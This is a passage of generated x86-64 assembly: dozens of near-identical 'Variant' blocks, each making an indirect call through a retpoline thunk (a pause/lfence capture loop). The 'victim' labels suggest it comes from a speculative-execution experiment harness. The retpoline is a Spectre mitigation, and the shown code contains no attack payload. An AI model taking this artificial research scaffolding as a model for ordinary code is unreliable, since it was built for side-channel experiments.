.Lgg_retpol_after_000127:
	jmp	.Lvictim_win0_continue
## Variant 128
.Lvictim_win0_var128:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000128
	jmp	.Lgg_retpol_after_000128
.Lgg_retpol_thunk_000128:
	callq	.Lgg_retpol_setup_000128
.Lgg_retpol_cap_000128:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000128
.Lgg_retpol_setup_000128:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000128:
	jmp	.Lvictim_win0_continue
## Variant 129
.Lvictim_win0_var129:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000129
	jmp	.Lgg_retpol_after_000129
.Lgg_retpol_thunk_000129:
	callq	.Lgg_retpol_setup_000129
.Lgg_retpol_cap_000129:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000129
.Lgg_retpol_setup_000129:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000129:
	jmp	.Lvictim_win0_continue
## Variant 130
.Lvictim_win0_var130:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000130
	jmp	.Lgg_retpol_after_000130
.Lgg_retpol_thunk_000130:
	callq	.Lgg_retpol_setup_000130
.Lgg_retpol_cap_000130:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000130
.Lgg_retpol_setup_000130:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000130:
	jmp	.Lvictim_win0_continue
## Variant 131
.Lvictim_win0_var131:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000131
	jmp	.Lgg_retpol_after_000131
.Lgg_retpol_thunk_000131:
	callq	.Lgg_retpol_setup_000131
.Lgg_retpol_cap_000131:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000131
.Lgg_retpol_setup_000131:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000131:
	jmp	.Lvictim_win0_continue
## Variant 132
.Lvictim_win0_var132:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000132
	jmp	.Lgg_retpol_after_000132
.Lgg_retpol_thunk_000132:
	callq	.Lgg_retpol_setup_000132
.Lgg_retpol_cap_000132:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000132
.Lgg_retpol_setup_000132:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000132:
	jmp	.Lvictim_win0_continue
## Variant 133
.Lvictim_win0_var133:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000133
	jmp	.Lgg_retpol_after_000133
.Lgg_retpol_thunk_000133:
	callq	.Lgg_retpol_setup_000133
.Lgg_retpol_cap_000133:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000133
.Lgg_retpol_setup_000133:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000133:
	jmp	.Lvictim_win0_continue
## Variant 134
.Lvictim_win0_var134:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000134
	jmp	.Lgg_retpol_after_000134
.Lgg_retpol_thunk_000134:
	callq	.Lgg_retpol_setup_000134
.Lgg_retpol_cap_000134:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000134
.Lgg_retpol_setup_000134:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000134:
	jmp	.Lvictim_win0_continue
## Variant 135
.Lvictim_win0_var135:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000135
	jmp	.Lgg_retpol_after_000135
.Lgg_retpol_thunk_000135:
	callq	.Lgg_retpol_setup_000135
.Lgg_retpol_cap_000135:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000135
.Lgg_retpol_setup_000135:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000135:
	jmp	.Lvictim_win0_continue
## Variant 136
.Lvictim_win0_var136:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000136
	jmp	.Lgg_retpol_after_000136
.Lgg_retpol_thunk_000136:
	callq	.Lgg_retpol_setup_000136
.Lgg_retpol_cap_000136:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000136
.Lgg_retpol_setup_000136:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000136:
	jmp	.Lvictim_win0_continue
## Variant 137
.Lvictim_win0_var137:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000137
	jmp	.Lgg_retpol_after_000137
.Lgg_retpol_thunk_000137:
	callq	.Lgg_retpol_setup_000137
.Lgg_retpol_cap_000137:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000137
.Lgg_retpol_setup_000137:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000137:
	jmp	.Lvictim_win0_continue
## Variant 138
.Lvictim_win0_var138:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000138
	jmp	.Lgg_retpol_after_000138
.Lgg_retpol_thunk_000138:
	callq	.Lgg_retpol_setup_000138
.Lgg_retpol_cap_000138:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000138
.Lgg_retpol_setup_000138:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000138:
	jmp	.Lvictim_win0_continue
## Variant 139
.Lvictim_win0_var139:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000139
	jmp	.Lgg_retpol_after_000139
.Lgg_retpol_thunk_000139:
	callq	.Lgg_retpol_setup_000139
.Lgg_retpol_cap_000139:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000139
.Lgg_retpol_setup_000139:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000139:
	jmp	.Lvictim_win0_continue
## Variant 140
.Lvictim_win0_var140:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000140
	jmp	.Lgg_retpol_after_000140
.Lgg_retpol_thunk_000140:
	callq	.Lgg_retpol_setup_000140
.Lgg_retpol_cap_000140:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000140
.Lgg_retpol_setup_000140:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000140:
	jmp	.Lvictim_win0_continue
## Variant 141
.Lvictim_win0_var141:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000141
	jmp	.Lgg_retpol_after_000141
.Lgg_retpol_thunk_000141:
	callq	.Lgg_retpol_setup_000141
.Lgg_retpol_cap_000141:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000141
.Lgg_retpol_setup_000141:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000141:
	jmp	.Lvictim_win0_continue
## Variant 142
.Lvictim_win0_var142:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000142
	jmp	.Lgg_retpol_after_000142
.Lgg_retpol_thunk_000142:
	callq	.Lgg_retpol_setup_000142
.Lgg_retpol_cap_000142:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000142
.Lgg_retpol_setup_000142:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000142:
	jmp	.Lvictim_win0_continue
## Variant 143
.Lvictim_win0_var143:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000143
	jmp	.Lgg_retpol_after_000143
.Lgg_retpol_thunk_000143:
	callq	.Lgg_retpol_setup_000143
.Lgg_retpol_cap_000143:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000143
.Lgg_retpol_setup_000143:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000143:
	jmp	.Lvictim_win0_continue
## Variant 144
.Lvictim_win0_var144:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000144
	jmp	.Lgg_retpol_after_000144
.Lgg_retpol_thunk_000144:
	callq	.Lgg_retpol_setup_000144
.Lgg_retpol_cap_000144:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000144
.Lgg_retpol_setup_000144:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000144:
	jmp	.Lvictim_win0_continue
## Variant 145
.Lvictim_win0_var145:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000145
	jmp	.Lgg_retpol_after_000145
.Lgg_retpol_thunk_000145:
	callq	.Lgg_retpol_setup_000145
.Lgg_retpol_cap_000145:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000145
.Lgg_retpol_setup_000145:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000145:
	jmp	.Lvictim_win0_continue
## Variant 146
.Lvictim_win0_var146:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000146
	jmp	.Lgg_retpol_after_000146
.Lgg_retpol_thunk_000146:
	callq	.Lgg_retpol_setup_000146
.Lgg_retpol_cap_000146:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000146
.Lgg_retpol_setup_000146:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000146:
	jmp	.Lvictim_win0_continue
## Variant 147
.Lvictim_win0_var147:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000147
	jmp	.Lgg_retpol_after_000147
.Lgg_retpol_thunk_000147:
	callq	.Lgg_retpol_setup_000147
.Lgg_retpol_cap_000147:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000147
.Lgg_retpol_setup_000147:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000147:
	jmp	.Lvictim_win0_continue
## Variant 148
.Lvictim_win0_var148:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000148
	jmp	.Lgg_retpol_after_000148
.Lgg_retpol_thunk_000148:
	callq	.Lgg_retpol_setup_000148
.Lgg_retpol_cap_000148:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000148
.Lgg_retpol_setup_000148:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000148:
	jmp	.Lvictim_win0_continue
## Variant 149
.Lvictim_win0_var149:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000149
	jmp	.Lgg_retpol_after_000149
.Lgg_retpol_thunk_000149:
	callq	.Lgg_retpol_setup_000149
.Lgg_retpol_cap_000149:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000149
.Lgg_retpol_setup_000149:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000149:
	jmp	.Lvictim_win0_continue
## Variant 150
.Lvictim_win0_var150:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000150
	jmp	.Lgg_retpol_after_000150
.Lgg_retpol_thunk_000150:
	callq	.Lgg_retpol_setup_000150
.Lgg_retpol_cap_000150:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000150
.Lgg_retpol_setup_000150:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000150:
	jmp	.Lvictim_win0_continue
## Variant 151
.Lvictim_win0_var151:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000151
	jmp	.Lgg_retpol_after_000151
.Lgg_retpol_thunk_000151:
	callq	.Lgg_retpol_setup_000151
.Lgg_retpol_cap_000151:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000151
.Lgg_retpol_setup_000151:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000151:
	jmp	.Lvictim_win0_continue
## Variant 152
.Lvictim_win0_var152:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000152
	jmp	.Lgg_retpol_after_000152
.Lgg_retpol_thunk_000152:
	callq	.Lgg_retpol_setup_000152
.Lgg_retpol_cap_000152:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000152
.Lgg_retpol_setup_000152:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000152:
	jmp	.Lvictim_win0_continue
## Variant 153
.Lvictim_win0_var153:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000153
	jmp	.Lgg_retpol_after_000153
.Lgg_retpol_thunk_000153:
	callq	.Lgg_retpol_setup_000153
.Lgg_retpol_cap_000153:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000153
.Lgg_retpol_setup_000153:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000153:
	jmp	.Lvictim_win0_continue
## Variant 154
.Lvictim_win0_var154:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000154
	jmp	.Lgg_retpol_after_000154
.Lgg_retpol_thunk_000154:
	callq	.Lgg_retpol_setup_000154
.Lgg_retpol_cap_000154:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000154
.Lgg_retpol_setup_000154:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000154:
	jmp	.Lvictim_win0_continue
## Variant 155
.Lvictim_win0_var155:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000155
	jmp	.Lgg_retpol_after_000155
.Lgg_retpol_thunk_000155:
	callq	.Lgg_retpol_setup_000155
.Lgg_retpol_cap_000155:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000155
.Lgg_retpol_setup_000155:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000155:
	jmp	.Lvictim_win0_continue
## Variant 156
.Lvictim_win0_var156:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000156
	jmp	.Lgg_retpol_after_000156
.Lgg_retpol_thunk_000156:
	callq	.Lgg_retpol_setup_000156
.Lgg_retpol_cap_000156:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000156
.Lgg_retpol_setup_000156:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000156:
	jmp	.Lvictim_win0_continue
## Variant 157
.Lvictim_win0_var157:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000157
	jmp	.Lgg_retpol_after_000157
.Lgg_retpol_thunk_000157:
	callq	.Lgg_retpol_setup_000157
.Lgg_retpol_cap_000157:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000157
.Lgg_retpol_setup_000157:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000157:
	jmp	.Lvictim_win0_continue
## Variant 158
.Lvictim_win0_var158:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000158
	jmp	.Lgg_retpol_after_000158
.Lgg_retpol_thunk_000158:
	callq	.Lgg_retpol_setup_000158
.Lgg_retpol_cap_000158:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000158
.Lgg_retpol_setup_000158:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000158:
	jmp	.Lvictim_win0_continue
## Variant 159
.Lvictim_win0_var159:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000159
	jmp	.Lgg_retpol_after_000159
.Lgg_retpol_thunk_000159:
	callq	.Lgg_retpol_setup_000159
.Lgg_retpol_cap_000159:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000159
.Lgg_retpol_setup_000159:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000159:
	jmp	.Lvictim_win0_continue
## Variant 160
.Lvictim_win0_var160:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000160
	jmp	.Lgg_retpol_after_000160
.Lgg_retpol_thunk_000160:
	callq	.Lgg_retpol_setup_000160
.Lgg_retpol_cap_000160:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000160
.Lgg_retpol_setup_000160:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000160:
	jmp	.Lvictim_win0_continue
## Variant 161
.Lvictim_win0_var161:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000161
	jmp	.Lgg_retpol_after_000161
.Lgg_retpol_thunk_000161:
	callq	.Lgg_retpol_setup_000161
.Lgg_retpol_cap_000161:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000161
.Lgg_retpol_setup_000161:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000161:
	jmp	.Lvictim_win0_continue
## Variant 162
.Lvictim_win0_var162:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000162
	jmp	.Lgg_retpol_after_000162
.Lgg_retpol_thunk_000162:
	callq	.Lgg_retpol_setup_000162
.Lgg_retpol_cap_000162:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000162
.Lgg_retpol_setup_000162:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000162:
	jmp	.Lvictim_win0_continue
## Variant 163
.Lvictim_win0_var163:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000163
	jmp	.Lgg_retpol_after_000163
.Lgg_retpol_thunk_000163:
	callq	.Lgg_retpol_setup_000163
.Lgg_retpol_cap_000163:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000163
.Lgg_retpol_setup_000163:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000163:
	jmp	.Lvictim_win0_continue
## Variant 164
.Lvictim_win0_var164:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000164
	jmp	.Lgg_retpol_after_000164
.Lgg_retpol_thunk_000164:
	callq	.Lgg_retpol_setup_000164
.Lgg_retpol_cap_000164:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000164
.Lgg_retpol_setup_000164:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000164:
	jmp	.Lvictim_win0_continue
## Variant 165
.Lvictim_win0_var165:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000165
	jmp	.Lgg_retpol_after_000165
.Lgg_retpol_thunk_000165:
	callq	.Lgg_retpol_setup_000165
.Lgg_retpol_cap_000165:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000165
.Lgg_retpol_setup_000165:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000165:
	jmp	.Lvictim_win0_continue
## Variant 166
.Lvictim_win0_var166:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000166
	jmp	.Lgg_retpol_after_000166
.Lgg_retpol_thunk_000166:
	callq	.Lgg_retpol_setup_000166
.Lgg_retpol_cap_000166:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000166
.Lgg_retpol_setup_000166:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000166:
	jmp	.Lvictim_win0_continue
## Variant 167
.Lvictim_win0_var167:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000167
	jmp	.Lgg_retpol_after_000167
.Lgg_retpol_thunk_000167:
	callq	.Lgg_retpol_setup_000167
.Lgg_retpol_cap_000167:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000167
.Lgg_retpol_setup_000167:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000167:
	jmp	.Lvictim_win0_continue
## Variant 168
.Lvictim_win0_var168:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000168
	jmp	.Lgg_retpol_after_000168
.Lgg_retpol_thunk_000168:
	callq	.Lgg_retpol_setup_000168
.Lgg_retpol_cap_000168:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000168
.Lgg_retpol_setup_000168:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000168:
	jmp	.Lvictim_win0_continue
## Variant 169
.Lvictim_win0_var169:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000169
	jmp	.Lgg_retpol_after_000169
.Lgg_retpol_thunk_000169:
	callq	.Lgg_retpol_setup_000169
.Lgg_retpol_cap_000169:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000169
.Lgg_retpol_setup_000169:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000169:
	jmp	.Lvictim_win0_continue
## Variant 170
.Lvictim_win0_var170:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000170
	jmp	.Lgg_retpol_after_000170
.Lgg_retpol_thunk_000170:
	callq	.Lgg_retpol_setup_000170
.Lgg_retpol_cap_000170:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000170
.Lgg_retpol_setup_000170:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000170:
	jmp	.Lvictim_win0_continue
## Variant 171
.Lvictim_win0_var171:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000171
	jmp	.Lgg_retpol_after_000171
.Lgg_retpol_thunk_000171:
	callq	.Lgg_retpol_setup_000171
.Lgg_retpol_cap_000171:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000171
.Lgg_retpol_setup_000171:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000171:
	jmp	.Lvictim_win0_continue
## Variant 172
.Lvictim_win0_var172:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000172
	jmp	.Lgg_retpol_after_000172
.Lgg_retpol_thunk_000172:
	callq	.Lgg_retpol_setup_000172
.Lgg_retpol_cap_000172:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000172
.Lgg_retpol_setup_000172:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000172:
	jmp	.Lvictim_win0_continue
## Variant 173
.Lvictim_win0_var173:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000173
	jmp	.Lgg_retpol_after_000173
.Lgg_retpol_thunk_000173:
	callq	.Lgg_retpol_setup_000173
.Lgg_retpol_cap_000173:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000173
.Lgg_retpol_setup_000173:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000173:
	jmp	.Lvictim_win0_continue
## Variant 174
.Lvictim_win0_var174:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000174
	jmp	.Lgg_retpol_after_000174
.Lgg_retpol_thunk_000174:
	callq	.Lgg_retpol_setup_000174
.Lgg_retpol_cap_000174:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000174
.Lgg_retpol_setup_000174:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000174:
	jmp	.Lvictim_win0_continue
## Variant 175
.Lvictim_win0_var175:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000175
	jmp	.Lgg_retpol_after_000175
.Lgg_retpol_thunk_000175:
	callq	.Lgg_retpol_setup_000175
.Lgg_retpol_cap_000175:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000175
.Lgg_retpol_setup_000175:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000175:
	jmp	.Lvictim_win0_continue
## Variant 176
.Lvictim_win0_var176:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000176
	jmp	.Lgg_retpol_after_000176
.Lgg_retpol_thunk_000176:
	callq	.Lgg_retpol_setup_000176
.Lgg_retpol_cap_000176:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000176
.Lgg_retpol_setup_000176:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000176:
	jmp	.Lvictim_win0_continue
## Variant 177
.Lvictim_win0_var177:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000177
	jmp	.Lgg_retpol_after_000177
.Lgg_retpol_thunk_000177:
	callq	.Lgg_retpol_setup_000177
.Lgg_retpol_cap_000177:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000177
.Lgg_retpol_setup_000177:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000177:
	jmp	.Lvictim_win0_continue
## Variant 178
.Lvictim_win0_var178:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000178
	jmp	.Lgg_retpol_after_000178
.Lgg_retpol_thunk_000178:
	callq	.Lgg_retpol_setup_000178
.Lgg_retpol_cap_000178:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000178
.Lgg_retpol_setup_000178:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000178:
	jmp	.Lvictim_win0_continue
## Variant 179
.Lvictim_win0_var179:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000179
	jmp	.Lgg_retpol_after_000179
.Lgg_retpol_thunk_000179:
	callq	.Lgg_retpol_setup_000179
.Lgg_retpol_cap_000179:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000179
.Lgg_retpol_setup_000179:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000179:
	jmp	.Lvictim_win0_continue
## Variant 180
.Lvictim_win0_var180:
	popq	%rax
